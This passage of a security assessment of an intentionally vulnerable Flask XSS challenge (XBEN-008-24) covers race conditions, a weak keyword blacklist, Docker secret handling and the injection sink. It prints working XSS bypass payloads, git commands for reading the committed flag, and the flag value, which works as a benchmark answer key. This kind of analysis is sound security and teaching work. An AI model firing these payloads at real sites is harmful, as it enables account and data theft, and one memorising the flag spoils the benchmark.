The application writes temporary HTML files to the `static/` directory with random filenames. While `os.urandom(16)` provides 128 bits of entropy (making prediction infeasible), the files are **accessible via HTTP** during the PhantomJS execution window (up to 5 seconds). Potential attack scenarios:

1. **Concurrent Request Timing Attack**: Attacker sends rapid concurrent requests with unique payloads, then attempts to access `/static/<random>.html` for all recent timestamps, potentially retrieving another user's payload.
2. **Error Message Filename Disclosure**: If an exception occurs during file operations and debug mode is enabled (it is), stack traces may leak the random filename.
3. **Filesystem Race Condition**: Between file creation (`open(fn, 'w')`) and deletion (`os.unlink(fn)`), another process or attacker could read the file if they gain filesystem access (e.g., via local file inclusion or container escape).

The cleanup occurs in a `finally` block (`app.py:48-50`), ensuring files are deleted even if exceptions occur, but this does not eliminate the race window.

### Internal Service Communication

**Finding: NO INTERNAL SERVICES**

The application is a monolithic architecture with no service-to-service communication. The only subprocess interaction is with PhantomJS, which is **not a network service** but a local headless browser:

**PhantomJS Subprocess Analysis:**

**File**: `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/app.py:34`

```python
proc = subprocess.Popen(["timeout","5","phantomjs", "check.js"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)
```

**Trust Relationship Analysis:**
- **Command Execution**: Uses array-style arguments (safe from shell injection)
- **Timeout**: 5-second limit via `timeout` command prevents infinite execution
- **Input Channel**: URL passed via stdin (`proc.stdin.write(url)`) - hardcoded localhost URL, not user-controlled
- **Output Channel**: Validation result read from stdout (`proc.stdout.readline()`)
- **Trust Assumption**: Application assumes PhantomJS is benign and correctly reports JavaScript dialog execution

**Security Weaknesses:**

1. **PhantomJS Deprecation**: PhantomJS (last release: 2018) contains known vulnerabilities in its WebKit engine. An attacker with advanced skills might exploit WebKit CVEs to:
   - Force a "SUCCESS" output without triggering legitimate dialogs
   - Escape the PhantomJS sandbox and execute commands on the host
   - Access the underlying filesystem (container environment)

2. **User-Controlled HTML Execution**: While the URL is hardcoded, the **HTML content** loaded by PhantomJS is user-controlled. This creates a JavaScript execution context where any XSS payload runs. Beyond simple `alert()` calls, sophisticated attackers might attempt:
   - Prototype pollution attacks against PhantomJS's JavaScript engine
   - WebKit heap corruption via malformed HTML/CSS
   - Filesystem access via PhantomJS's `require('fs')` module (if accessible)

3. **No Output Validation**: The application trusts PhantomJS output without validation. If an attacker can inject newlines or control characters into the PhantomJS output stream, they might manipulate the `result` variable to force flag disclosure.

### Input Validation Patterns

The application implements **one input validation mechanism**: a blacklist filter on the `name` GET parameter.

**Validation Location**: `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/app.py:66-73`

**Validation Logic**:

```python
blacklist = ['script', "onload", "onmouseover", "onclick", "onbegin", "onerror", "svg", "'"]
value =  "" if msg == "" else '> {0}'.format(msg)

for word in blacklist:
    if word in msg.lower():
        error_msg = """<div class="solution-text">Sorry you can't use: '%s'</div>""" % word
        value = ">"
        return PAGE_CONTENT.format("21","Star",value,"",error_msg)
```

**Security Analysis:**

This validation demonstrates **multiple anti-patterns** in secure input handling:

1. **Blacklist vs. Allowlist**: Security best practice mandates allowlist validation (permit only known-good patterns) rather than blacklist validation (block known-bad patterns). Blacklists are inherently incomplete—attackers constantly discover new bypass techniques.

2. **Incomplete Keyword Coverage**: The blacklist blocks 8 keywords but XSS has **dozens of exploitation vectors**:
   - **Unblocked HTML tags**: `<img>`, `<iframe>`, `<video>`, `<audio>`, `<object>`, `<embed>`, `<form>`, `<input>`, `<button>`, `<marquee>`, `<details>`, `<body>`, `<style>`, `<link>`, `<meta>`, `<base>`, `<math>`, `<picture>`, `<source>`, `<track>`, `<area>`, `<map>`, etc.
   - **Unblocked event handlers**: `onfocus`, `onblur`, `oninput`, `onchange`, `onsubmit`, `onreset`, `onselect`, `onresize`, `onscroll`, `onwheel`, `ondrag`, `ondrop`, `onanimationstart`, `onanimationend`, `onanimationiteration`, `ontransitionend`, `ontransitionstart`, `ontransitioncancel`, `onpointerover`, `onpointerenter`, `onpointerdown`, `onpointerup`, `onpointermove`, `onpointerout`, `onpointerleave`, `onpointercancel`, `ongotpointercapture`, `onlostpointercapture`, etc.
   - **Unblocked JavaScript URIs**: `javascript:alert(1)` (but must not contain single quotes)
   - **Unblocked data URIs**: `data:text/html,<script>alert(1)</script>` (blocked by `script` keyword, but `data:text/html,<img src=x onerror=alert(1)>` works)

3. **Case Sensitivity Bypass Attempts**: The filter uses `.lower()` to perform case-insensitive matching, preventing simple case variations (`sCrIpT`). However, this is irrelevant given the dozens of unblocked vectors.

4. **Substring vs. Whole-Word Matching**: The filter checks if the blacklisted word appears **anywhere** in the input (`if word in msg.lower()`). This means:
   - `"onclick"` is blocked
   - `"on" + "click"` (with URL-encoded space `%20`) would still be blocked when decoded
   - Alternative event handlers like `onfocus` bypass the check entirely

5. **No Encoding/Escaping**: After the blacklist check **passes**, the input undergoes **zero additional processing**:
   - No HTML entity encoding (`&lt;`, `&gt;`, `&quot;`, `&amp;`)
   - No attribute value escaping (quotes, angle brackets, null bytes)
   - No JavaScript string escaping
   - No URL encoding validation or canonicalization

6. **Context-Unaware Validation**: The filter does not consider the **rendering context**. The input is inserted into an HTML attribute context (`<input ... {value}>`), where different encoding rules apply compared to HTML body context, JavaScript context, or URL context. Proper validation would encode for the specific context.

**Recommended Validation Approach:**

A secure implementation would:
1. **Allowlist alphanumeric input**: `if not re.match(r'^[a-zA-Z0-9\s]+$', msg)`
2. **Context-aware encoding**: Use `cgi.escape(msg, quote=True)` or `html.escape(msg)` (Python 3)
3. **Content Security Policy**: Implement CSP to prevent inline scripts even if XSS occurs
4. **Framework-level escaping**: Use a template engine with auto-escaping (e.g., Jinja2 with autoescape)
5. **Input length limits**: Enforce maximum length to prevent buffer exhaustion attacks

However, since this is a **CTF challenge intentionally designed to teach XSS exploitation**, the weak validation is deliberate.

### Background Processing

**Finding: NO BACKGROUND PROCESSING**

The application has no asynchronous job queues, background workers, scheduled tasks, or message queues:

- **No Celery/RQ/Dramatiq**: No task queue frameworks
- **No cron jobs**: No scheduled execution
- **No message queues**: No RabbitMQ, Redis Queue, AWS SQS, etc.
- **No webhooks**: No outbound callback mechanisms (except PhantomJS validation)

**PhantomJS Execution (Not Background Processing):**

The PhantomJS subprocess (`check_solution()`) executes **synchronously** within the request-response cycle. The Flask route waits for PhantomJS to complete before returning the response (`app.py:47`: `result = proc.stdout.readline().strip()`). This has security implications:

1. **Request Timeout Vulnerability**: PhantomJS has a 5-second timeout (`timeout 5 phantomjs`), but Flask's default request timeout is much longer (WSGI server dependent, typically 30-300 seconds). An attacker could craft a payload that causes PhantomJS to hang (e.g., infinite loop in JavaScript), tying up Flask worker threads and leading to denial of service.

2. **Resource Exhaustion**: Each request spawns a PhantomJS process, which is resource-intensive (50-100MB RAM per process). Without rate limiting, an attacker could spawn hundreds of concurrent PhantomJS processes, exhausting server resources.

3. **No Privilege Separation**: PhantomJS runs with the same privileges as the Flask application (likely the container's default user, possibly root). A PhantomJS exploit could compromise the entire application.

---

## 6. Infrastructure & Operational Security

### Secrets Management

**CRITICAL FINDING: SECRETS COMMITTED TO VERSION CONTROL**

The most severe security failure in this application is the **hardcoded CTF flag in the `.env` file, committed to git**:

**File**: `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/.env`  
**Line**: 1  
**Content**: `FLAG="flag{1ed5a2a2-4910-4843-bfcf-61d3d8831730}"`  
**Git Status**: ✅ COMMITTED (present in commit `5e43e5f` and all subsequent commits)

**Attack Vector:**

Any attacker with read access to the git repository can retrieve the flag without solving the challenge:

```bash
# Bypass the XSS challenge entirely
git clone <repository_url>
cat .env
# Output: FLAG="flag{1ed5a2a2-4910-4843-bfcf-61d3d8831730}"

# Or retrieve from remote without cloning
git show HEAD:.env

# Or from git history if later removed
git log --all --full-history -- .env
git show <commit>:.env
```

**Additional Secret Exposure Vectors:**

1. **Docker Build Arguments** (`docker-compose.yml:5-6`):
```yaml
args:
  - FLAG
```
Build arguments are visible in Docker image history:
```bash
docker history <image_name> --no-trunc
# Shows: ARG FLAG=flag{1ed5a2a2-4910-4843-bfcf-61d3d8831730}
```

2. **Docker Image Layers** (`Dockerfile:25`):
```dockerfile
RUN sed -i s/@FLAG@/$FLAG/g secret.txt
```
The `sed` command executes with the FLAG value, potentially leaving traces in the image layer.

3. **Runtime File Access** (`secret.txt`):
An attacker who gains container access (e.g., via another vulnerability) can read `secret.txt` directly.

**Secret Rotation:**

The application has **no secret rotation mechanism**. Changing the flag requires:
1. Manual editing of `.env`
2. Rebuilding the Docker image
3. Restarting containers

There is no automated rotation, no secret versioning, and no grace period for accepting old and new secrets simultaneously.

**Secure Alternatives:**

Production-grade secret management should use:
- **Docker Secrets** (Swarm mode): `docker secret create flag <flag_file>`
- **Kubernetes Secrets**: `kubectl create secret generic flag --from-literal=FLAG=<value>`
- **HashiCorp Vault**: Centralized secret management with dynamic secrets
- **AWS Secrets Manager / Azure Key Vault / GCP Secret Manager**: Cloud-native secret stores
- **Environment variables at runtime** (NOT in `.env` committed to git): Inject via `docker run -e FLAG=<value>`

### Configuration Security

**Docker Configuration Analysis:**

**Dockerfile** (`/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/Dockerfile`):

```dockerfile
FROM python:2.7.18-slim

RUN sed -i s/deb.debian.org/archive.debian.org/g /etc/apt/sources.list && \
    sed -i s/security.debian.org/archive.debian.org/g /etc/apt/sources.list && \
    sed -i '/stretch-updates/d' /etc/apt/sources.list

RUN apt-get update && apt-get install -y \
    phantomjs \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /python-docker

COPY requirements.txt requirements.txt
RUN pip install -r requirements.txt

COPY . .

ARG FLAG
RUN sed -i s/@FLAG@/$FLAG/g secret.txt

CMD ["python", "-m", "flask", "run", "--host=0.0.0.0", "--port=5000"]

EXPOSE 5000
```

**Security Issues:**

1. **Archived Debian Repositories**: The Dockerfile modifies `sources.list` to use `archive.debian.org` instead of `deb.debian.org` and `security.debian.org`. This indicates the Debian version (Buster) is **end-of-life** and no longer receives security updates. The application inherits vulnerabilities in all system packages.

2. **Root User**: The Dockerfile does not create a non-root user, meaning the application runs as **root** inside the container. This violates the principle of least privilege. If an attacker exploits the application (e.g., via PhantomJS RCE), they gain root privileges in the container.

3. **No Health Checks**: The Dockerfile has no `HEALTHCHECK` instruction. Container orchestrators cannot detect if the application is unhealthy (e.g., deadlocked, out of memory).

4. **Overly Permissive Network Binding**: `--host=0.0.0.0` binds Flask to all network interfaces. In a multi-container environment, this exposes the application to all containers, not just the public-facing proxy.

5. **No Resource Limits**: No CPU or memory limits in the Dockerfile or docker-compose.yml. An attacker could exhaust resources via algorithmic complexity or memory leaks.

**Docker Compose Configuration** (`/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/docker-compose.yml`):

```yaml
services:
  dalgona_008:
    build:
      context: src
      args:
        - FLAG
    ports:
      - "5000:5000"
    healthcheck:
      test: ["CMD", "timeout", "10", "bash", "-c", "</dev/tcp/127.0.0.1/5000"]
      interval: 10s
      timeout: 10s
      retries: 3
      start_period: 5s
```

**Security Issues:**

1. **Port Exposure**: `5000:5000` exposes the application port directly to the host, bypassing any reverse proxy or firewall. In production, applications should be behind a reverse proxy (nginx, Traefik) for TLS termination, rate limiting, and security headers.

2. **Environment Variable Source**: The FLAG build argument sources from the `.env` file (Docker Compose default behavior), which is committed to git.

3. **No Network Isolation**: The service is on the default bridge network with no isolation. All containers can communicate.

4. **No Security Options**: No AppArmor profiles, no seccomp filters, no capability dropping, no read-only root filesystem.

### External Dependencies

**Python Dependencies** (`requirements.txt`):

```
Flask==1.1.4
phantomjs
```

**Dependency Analysis:**

1. **Flask 1.1.4** (Released May 2021):
   - Current version: Flask 3.0.x
   - **Known CVEs**:
     - CVE-2023-30861 (Cookie parsing vulnerability)
     - Missing security features from Flask 2.x and 3.x
   - **Transitive dependencies**:
     - Werkzeug (WSGI utility library, multiple CVEs)
     - Jinja2 (template engine, SSTI vulnerabilities)
     - ItsDangerous (signing library, potential timing attacks)
     - Click (CLI framework, lower risk)

2. **phantomjs** (PyPI package):
   - This is a **wrapper package** that downloads the PhantomJS binary
   - PhantomJS itself (last release: 2.1.1, January 2016):
     - **Officially abandoned** (project suspended March 2018)
     - Based on **Qt WebKit** (forked from QtWebKit 5.5, circa 2015)
     - **Known vulnerabilities**: Dozens of WebKit CVEs affecting JavaScript engine, DOM parsing, CSS rendering
     - **No security patches** since 2016

**System Dependencies** (via `apt-get`):

- **phantomjs** (Debian package)
- Base image: `python:2.7.18-slim` (Debian Buster, archived)
  - All system packages are outdated and unpatched

**Third-Party Service Dependencies:**

The application has **no external service dependencies**:
- No API calls to third-party services
- No CDN resources
- No external authentication providers
- No payment processors
- No analytics services

**Supply Chain Risks:**

1. **Deprecated Package Ecosystem**: The entire Python 2.7 ecosystem is unmaintained. PyPI no longer enforces security checks for Python 2 packages.

2. **Archived OS Repositories**: Debian Buster packages are served from `archive.debian.org`, which mirrors old, unpatched versions. There is no security team monitoring or patching these packages.

3. **Phantom PhantomJS Maintenance**: The `phantomjs` PyPI package downloads binaries from unofficial mirrors, creating a supply chain attack vector. An attacker compromising these mirrors could distribute backdoored PhantomJS binaries.

### Monitoring & Logging

**Logging Configuration:**

**File**: `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/app.py:17`

```python
logging.basicConfig(level=logging.INFO)
```

This configures Python's built-in logging to INFO level, outputting to stdout/stderr.

**Security Event Logging:**

The application logs **no security-relevant events**:
- ❌ No authentication attempts (no authentication exists)
- ❌ No authorization failures (no authorization exists)
- ❌ No input validation failures (blacklist rejections are not logged)
- ❌ No rate limiting violations (no rate limiting exists)
- ❌ No suspicious activity detection

**Data Leakage in Logs:**

The application logs **sensitive user input** to stdout:

**File**: `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/app.py:41-47`

```python
print "Page:"
print page  # Contains user-provided HTML (potential XSS payloads)
proc.stdin.write(url)
proc.stdin.close()
result = proc.stdout.readline().strip()
print "Result:"
print result  # Contains PhantomJS validation result
```

**Security Implications:**

1. **XSS Payload Disclosure**: User XSS payloads are logged verbatim. In a multi-user environment, logs could leak exploitation techniques between attackers.

2. **Log Injection**: User input containing newline characters (`\n`) or ANSI escape sequences could inject fake log entries or manipulate terminal output.

3. **No Log Rotation**: Docker captures stdout/stderr, but with no rotation configuration, logs could exhaust disk space.

4. **No Audit Trail**: The application cannot answer forensic questions like:
   - Who attempted to access the flag?
   - What payloads were tried?
   - Were there brute-force attempts?
   - What IP addresses accessed the application?

**Monitoring:**

The application has **no monitoring instrumentation**:
- ❌ No metrics collection (Prometheus, StatsD)
- ❌ No application performance monitoring (APM)
- ❌ No error tracking (Sentry, Rollbar)
- ❌ No uptime monitoring
- ❌ No security monitoring (IDS/IPS)

The only health check is a TCP connection test (`docker-compose.yml:10-15`), which verifies the port is open but not that the application is functional.

---

## 7. Overall Codebase Indexing

The XBEN-008-24 codebase is a **minimal monolithic Flask application** organized in a flat structure with deliberate simplicity. The entire application comprises approximately **300 lines of code** across three primary modules (two Python files and one JavaScript file), with the remainder consisting of static assets (HTML templates in constants, CSS stylesheets, images, and fonts). This minimalist architecture reflects the application's purpose as a **single-purpose CTF challenge** focused exclusively on XSS exploitation techniques.

**Directory Structure Analysis:**

```
XBEN-008-24/
├── .env                          # ⚠️ CRITICAL: Contains FLAG secret committed to git
├── .git/                         # Version control (contains secret history)
├── .xben_build_done             # Build completion marker
├── Makefile                      # Build automation (Docker Compose wrapper)
├── benchmark.json               # Challenge metadata (difficulty, tags, scoring)
├── docker-compose.yml           # Service orchestration, health checks
└── src/                         # Application root (Docker build context)
    ├── app.py                   # Main Flask application (85 lines)
    ├── constants.py             # HTML templates & route mappings (206 lines)
    ├── check.js                 # PhantomJS validation script (48 lines)
    ├── Dockerfile               # Container definition
    ├── README.md                # Documentation (minimal)
    ├── requirements.txt         # Python dependencies (2 packages)
    ├── secret.txt              # Flag placeholder (@FLAG@, replaced at build)
    └── static/                 # Web-accessible assets
        ├── assets/             # Application icons
        │   └── fav-icon.png    # Favicon (7KB)
        ├── css/                # Stylesheets
        │   ├── challenges/     # Per-challenge CSS (7 files, ~2KB each)
        │   │   ├── challenge1.css through challenge6.css
        │   │   └── challenge_medium.css
        │   ├── fonts/          # Font files (Game-Of-Squids themed)
        │   │   ├── Game-Of-Squids.eot/svg/ttf/woff/woff2
        │   └── style.css       # Main stylesheet (~16KB)
        └── img/                # Images
            ├── cookies/        # Challenge-specific images (correct.png, fail.png, process.png)
            ├── dalgonabg.jpg  # Background image (1.7MB)
            └── logo5_white.png # Logo (347KB)
```

**Code Organization and Security Implications:**

1. **Flat Python Architecture**: The application eschews typical Flask project structures (blueprints, models, views separation, config modules) in favor of two monolithic files. `app.py` contains all routing, business logic, and subprocess execution, while `constants.py` stores HTML templates as Python string constants. This flat structure makes the codebase easy to audit (all logic in one file) but violates separation of concerns and would be unmaintainable at scale.

2. **No Testing Infrastructure**: The codebase contains **no test files, no test fixtures, no CI/CD configurations**. There is no `tests/` directory, no pytest configuration, no unit tests, no integration tests. This means security regressions could be introduced without detection. For a CTF challenge, this is acceptable; for production code, it would be catastrophic.

3. **Static Assets as Primary File Size**: The codebase is **90% static assets by file size**. The background image (`dalgonabg.jpg`, 1.7MB) and logo (`logo5_white.png`, 347KB) account for over 2MB, while the entire Python codebase is under 10KB. This reflects the application's visual design focus over complex backend logic.

4. **Build System Simplicity**: The `Makefile` serves as a thin wrapper around Docker Compose, providing targets like `build`, `up`, `down`. It sources the `.env` file (Line 1: `include .env`) and passes FLAG to Docker. This makes the secret management vulnerability more severe—the Makefile explicitly documents that FLAG comes from `.env`, yet `.env` is committed to git.

5. **Challenge Metadata Externalization**: The `benchmark.json` file contains challenge metadata (difficulty rating, vulnerability categories, point values) in a structured format, suggesting this application is part of a larger CTF platform. The metadata identifies this as a "Medium" difficulty XSS challenge tagged with `["xss", "web"]`.

**Discoverability of Security Components:**

The flat structure makes security-relevant components **trivially discoverable**:

- **Input validation**: Search for `blacklist` → immediately finds `app.py:66`
- **Flag storage**: Search for `flag` → finds `.env:1`, `secret.txt:1`, `app.py:22,56`
- **Subprocess execution**: Search for `subprocess` → finds `app.py:34`
- **Security headers**: Search for `headers` → finds `app.py:79` (X-XSS-Protection)
- **Routing**: All routes in `app.py:29-31, 63-80` (2 routes total)

However, this simplicity is deceptive—**security controls are not just easy to find, they are completely absent or deliberately weakened**. An auditor expecting standard security patterns (authentication decorators, CSRF protection, input validation libraries) will find none.

**Code Generation and Tooling Conventions:**

The codebase shows **no evidence of code generation, linters, or security scanning tools**:
- No `.pylintrc`, `.flake8`, `mypy.ini` (no Python linters configured)
- No `bandit.yaml` (no security scanner configuration)
- No `pre-commit` hooks
- No `.editorconfig`
- No dependency vulnerability scanning (`safety`, `snyk`, `dependabot`)

The HTML templates in `constants.py` are hand-written, with no template preprocessors or component frameworks. The CSS uses custom fonts and manual styling, with no CSS preprocessors (SASS/LESS) or CSS frameworks (Bootstrap, Tailwind). This indicates the application was **hand-crafted for a specific CTF challenge** rather than generated from a template or framework boilerplate.

**Git History and Secret Exposure:**

The presence of `.git/` with the `.env` file committed creates a **permanent secret exposure**. Even if `.env` were removed in a later commit, the secret remains in git history. Git forensics would reveal:

```bash
git log --all --full-history -- .env       # Shows all commits touching .env
git show <commit_hash>:.env                # Retrieves .env content from any commit
git rev-list --all | xargs git grep FLAG   # Searches all commits for FLAG mentions
```

The `.gitignore` file does not exist or does not include `.env`, allowing the secret to be committed. This is a **configuration management failure** independent of the code's security vulnerabilities.

**Deployment and Orchestration:**

The Docker Compose setup is production-ready in terms of functionality (health checks, port mapping, build arguments) but **critically insecure** in terms of secret handling and container security:

- **Hardcoded secrets in build context**: The `.env` file is in the Docker build context (`src/` directory), so even if not committed to git, it would be baked into Docker image layers.
- **Build-time secret injection**: Using `ARG FLAG` and `sed` to replace `@FLAG@` at build time means the secret is **permanently embedded in the image**. Best practice is runtime secret injection via environment variables or Docker/Kubernetes secrets.
- **No multi-stage builds**: The Dockerfile could use multi-stage builds to avoid including build tools (pip, apt) in the final image, reducing attack surface.

**Overall Assessment:**

This is a **deliberately minimal codebase optimized for a single-purpose CTF challenge**. The flat structure, absence of testing, and minimal dependencies make it easy to audit and understand, which is appropriate for educational security challenges. However, the codebase demonstrates multiple **anti-patterns that would be catastrophic in production**:

- Secrets committed to version control
- No security controls (authentication, authorization, CSRF, rate limiting)
- Deprecated and vulnerable dependencies (Python 2.7, Flask 1.1.4, PhantomJS)
- Debug mode enabled
- No monitoring, logging, or observability
- No testing or CI/CD
- Root container execution
- Overly permissive network configuration

For penetration testers, this codebase is **completely transparent**: all vulnerabilities are discoverable via static analysis, making it an ideal target for automated scanning and manual code review. The challenge lies not in discovering the vulnerabilities but in **exploiting the XSS vulnerability** to bypass the blacklist and trigger JavaScript dialogs in PhantomJS.

---

## 8. Critical File Paths

Below are all security-relevant file paths referenced in this analysis, categorized by their role in the application's security posture. These files constitute the **complete attack surface** and **security control inventory** for manual review by penetration testers.

### Configuration

- `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/.env` - **CRITICAL**: Contains hardcoded FLAG secret committed to git
- `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/docker-compose.yml` - Service orchestration, port exposure, health checks, build arguments
- `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/Dockerfile` - Container build definition, ARG FLAG, sed replacement, root user execution
- `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/Makefile` - Build automation, sources .env file
- `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/benchmark.json` - Challenge metadata (difficulty, tags, scoring)

### Authentication & Authorization

**No authentication or authorization files exist in this application.**

### API & Routing

- `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/app.py` - Main Flask application (routes, input validation, subprocess execution, flag disclosure)
  - Lines 29-31: `GET /` route (index page)
  - Lines 63-80: `GET /page` route (vulnerable XSS challenge endpoint)
  - Line 65: User input source (`request.args.get('name','')`)
  - Lines 66-73: Blacklist input validation
  - Line 67: Unsafe string formatting (`'> {0}'.format(msg)`)
  - Line 79: Disabled XSS protection (`X-XSS-Protection: 0`)
- `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/constants.py` - HTML templates and route mappings
  - Line 49: XSS injection point in input tag (`<input type=text name=name placeholder="..." {2}>`)
  - Lines 158-202: INDEX_CONTENT (landing page HTML)
  - Lines 20-149: PAGE_CONTENT templates (challenge pages)

### Data Models & DB Interaction

**No database or data models exist in this application.**

### Dependency Manifests

- `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/requirements.txt` - Python dependencies (Flask==1.1.4, phantomjs)

### Sensitive Data & Secrets Handling

- `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/.env` - **CRITICAL**: Hardcoded FLAG secret `flag{1ed5a2a2-4910-4843-bfcf-61d3d8831730}`
- `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/secret.txt` - Flag placeholder (@FLAG@, replaced at Docker build time)
- `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/app.py`
  - Line 22: Flag file read (`flags = open('secret.txt').read().split()`)
  - Line 56: Flag disclosure on successful XSS (`'Here is the flag: {1}'.format(...,flag)`)

### Middleware & Input Validation

- `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/app.py`
  - Lines 66-73: Blacklist input validation (weak, bypassable)
  - Line 58: Output encoding with `cgi.escape()` (inconsistent usage)
  - Line 25: Exception propagation (`app.config['PROPAGATE_EXCEPTIONS'] = True`)
  - Line 79: Disabled XSS protection header

### Logging & Monitoring

- `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/app.py`
  - Line 17: Logging configuration (`logging.basicConfig(level=logging.INFO)`)
  - Lines 41-47: User input logging (`print "Page:"`, `print page`)

### Infrastructure & Deployment

- `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/Dockerfile` - Container definition (Python 2.7.18-slim, PhantomJS installation, FLAG injection, root user)
- `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/docker-compose.yml` - Service definition (port 5000 exposure, health check, FLAG build arg)
- `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/Makefile` - Build orchestration (sources .env, Docker Compose wrapper)

### CTF Flag Storage

- `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/.env` - **Line 1**: `FLAG="flag{1ed5a2a2-4910-4843-bfcf-61d3d8831730}"` (COMMITTED TO GIT)
- `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/secret.txt` - Runtime flag storage (contains actual flag after Docker build)
- `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/app.py:22` - Flag loading (`open('secret.txt').read().split()`)
- `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/app.py:56` - Flag disclosure on XSS success
- `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/Dockerfile:23-25` - FLAG build argument and sed replacement
- `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/docker-compose.yml:5-6` - FLAG build argument passed from environment

### Vulnerability Exploitation Components

- `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/app.py`
  - Lines 33-50: PhantomJS subprocess execution and validation
  - Line 34: Subprocess spawn (`subprocess.Popen(["timeout","5","phantomjs", "check.js"])`)
  - Line 35: Temporary file generation in static/ (`fn = "static/" + os.urandom(16).encode('hex') + '.html'`)
  - Line 38-40: File write operation (user HTML written to disk)
  - Line 50: File cleanup (`os.unlink(fn)`)
- `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/check.js` - PhantomJS validation script (detects alert/confirm/prompt, triggers focus events)
  - Lines 8-18: JavaScript dialog listeners (alert, confirm, prompt)
  - Lines 27-33: Auto-trigger focus events on `[autofocus]` and `[onfocus]` elements

### Static Assets (Web-Accessible)

- `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/static/` - Web-accessible directory (temporary HTML files created here during validation)
- `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/static/css/style.css` - Main stylesheet
- `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/static/css/challenges/` - Per-challenge CSS files
- `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/static/img/` - Images directory
- `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/static/assets/` - Application assets (favicon)

---

## 9. XSS Sinks and Render Contexts

### Network-Accessible XSS Vulnerability

This application contains **one intentionally exploitable XSS vulnerability** on the network-accessible `/page` endpoint. The vulnerability is **directly exploitable** with trivial bypass techniques due to an incomplete blacklist filter.

### Primary XSS Sink: HTML Attribute Injection

**Type**: Reflected XSS via HTML Attribute Context Injection  
**Severity**: **CRITICAL** (Intentional CTF Challenge)  
**Exploitability**: Direct exploitation, blacklist easily bypassed

**Sink Location**: `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/app.py:67`

```python
value = "" if msg == "" else '> {0}'.format(msg)
```

**Render Context**: HTML Input Tag Attribute  
**Template Location**: `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-008-24/src/constants.py:49`

```html
<input type=text name=name placeholder="Enter your name..." {2}>
```

**Data Flow Path**:

```
1. User Input Source:
   HTTP GET /page?name=<PAYLOAD>
   ↓
   app.py:65 - request.args.get('name','') → msg variable

2. Input Validation (WEAK BLACKLIST):
   app.py:66-73 - Blacklist check for 8 keywords:
   ['script', 'onload', 'onmouseover', 'onclick', 'onbegin', 'onerror', 'svg', "'"]
   ↓
   If blacklisted word found: return error message
   If bypassed: continue to formatting

3. String Formatting (INJECTION POINT):
   app.py:67 - value = '> {0}'.format(msg)
   ↓
   User input injected with NO ENCODING

4. Template Rendering:
   app.py:75,78 - PAGE_CONTENT.format("21","Star",value, result, "")
   ↓
   constants.py:49 - <input type=text name=name placeholder="..." {value}>

5. HTML Output:
   <input type=text name=name placeholder="Enter your name..." > <PAYLOAD>>
   ↓
   Rendered in browser (PhantomJS for validation, user's browser for display)

6. JavaScript Execution:
   XSS payload executes in browser context
   ↓
   If alert/confirm/prompt triggered in PhantomJS: Flag disclosed
```

**Render Context Analysis**:

The user payload appears in an **HTML attribute context** immediately following the `placeholder` attribute within an `<input>` tag. The injection occurs **after the closing quote of the placeholder attribute**, creating this structure:

```html
<input type=text name=name placeholder="Enter your name..." > USER_PAYLOAD_HERE>
```

This context allows for:
1. **Attribute injection**: Adding new event handler attributes (e.g., `onfocus=alert(1)`)
2. **Tag closing and new tag injection**: Breaking out with `">` and creating new tags (e.g., `"><img src=x onerror=alert(1)>`)
3. **Inline event handlers**: Since attributes are not quoted, spaces can separate multiple attributes

**Blacklist Bypass Techniques**:

The blacklist blocks 8 keywords: `['script', 'onload', 'onmouseover', 'onclick', 'onbegin', 'onerror', 'svg', "'']`

**Bypass Method 1: Alternative Event Handlers (Not in Blacklist)**

Dozens of event handlers are **not blocked**:

```
Payload: autofocus onfocus=alert(document.domain)
Rendered: <input type=text name=name placeholder="..." > autofocus onfocus=alert(document.domain)>
Result: Triggers focus event immediately due to autofocus attribute

Payload: onwheel=alert(1)
Rendered: <input type=text name=name placeholder="..." > onwheel=alert(1)>
Result: Triggers when user scrolls mouse wheel over input

Payload: oninput=alert(1)
Rendered: <input type=text name=name placeholder="..." > oninput=alert(1)>
Result: Triggers when user types in input

Payload: onanimationstart=alert(1) style=animation-name:x
Rendered: <input type=text name=name placeholder="..." > onanimationstart=alert(1) style=animation-name:x>
